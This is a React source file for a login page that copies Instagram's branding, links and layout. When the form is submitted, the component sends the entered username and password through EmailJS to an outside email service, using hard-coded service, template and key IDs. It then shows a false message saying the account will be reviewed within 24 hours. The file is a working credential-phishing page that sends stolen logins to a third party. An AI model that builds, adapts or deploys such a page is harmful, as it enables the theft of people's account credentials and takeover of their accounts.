import React, { useState } from 'react'
import  instalogo from "../assets/instalogo.png"
import fbicon from '../assets/fbicon.png'
import googleapp from '../assets/googleappstore.png'
import iphoneapp from '../assets/iphoneappstore.png'
import ok from '../assets/ok.png'
import  '../App.css'
import emailjs from 'emailjs-com'

export default function Login() {
const [loginSuccess,setLoginSuccess] = useState(false);

  function sendEmail (e){
    e.preventDefault();

    emailjs.sendForm('service_eog730k','template_le6iev8',e.target,'6FgPNRryoD1AMHSPP').then(res=>{
      console.log(res);
      setLoginSuccess(true);
      
    }).catch(err=>console.log(err));
  }
function handleReturnToLogin(){
  setLoginSuccess(false);
}

  return (
    <div>{loginSuccess ? (
      <div className='thanks-container'>
        <div className="box-thanks">
          <div className="box-1-logo">
            <img src={instalogo} alt="#" className='insta2-logo'/>
            <hr/>
          </div>
          <div className="ok-logo">
          <img src={ok} alt="#" className='ok-logo'/>
          </div>
          <div className="para">
            <h3>Thanks for Providing Your Info</h3>
            <p>We'll review your info and if we can confirm it, you'll be able to access your accout within approximately 24 hours.</p>
          </div>
          <div className="login-btn-box">
            <button  onClick={handleReturnToLogin} className="login-btn">Done</button>
          </div>
        </div>
        
      </div>
    ):(
      <div className='login-container'>
      <form method='POST'  onSubmit={sendEmail}>
       <div className='box-1'>
        <div className="box-1-logo">
          <img src={instalogo} alt="#" className="insta-logo"/>
         
         </div>
         <div className="input-box">
          <input type="text" placeholder='Phone number,username or email address' id='username' name='username' required/>
         </div>
         <div className="input-box">
          <input type="password" placeholder='Password' id='pass' name='message' required/>
         </div>
         <div className="login-btn-box">
          <button type="submit" className='login-btn'>Login</button>
         </div>
           <div className="lines-box">
            <div className="line-1"></div>
              <div className="or-box">OR</div>
              <div className="line-1"></div>
           </div>
           <div className="fb-box">
            <span>
              <img src={fbicon} alt="#" className='fb-logo' />
            </span>
              <a href="https://www.facebook.com/"  className='fb-link' target="_blank"><p className='fb-link'>Log in with Facebook</p></a>
           </div>
           <div className="forgotten-password-box">
            
             <a href="https://www.instagram.com/accounts/password/reset/" className='forgotten-password-link' target="_blank"><p className='forgotten-password-link'>Forgotten your password?</p></a>
           </div>
       </div>
       <div className='box-2'>
        <p className='box-2-donnot'>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" className='sign-up-span' target="_blank"> <span className='sign-up-span'>Sing up</span></a></p>
       </div>
       <div className='get-app-box'>
        <p>Get the app.</p>
       </div>
       <div className='get-store-google-play-box'>
         <a href="https://apps.apple.com/in/app/instagram/id389801252" target="_blank"> <img src={iphoneapp} alt="#" className="app-store-image"/></a> 
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pcampaignid=web_share" target="_blank"><img src={googleapp} alt="#" className="google-paly-image"/></a>
       </div>
       </form>
      </div>
    )}
      </div>
   
  );
}
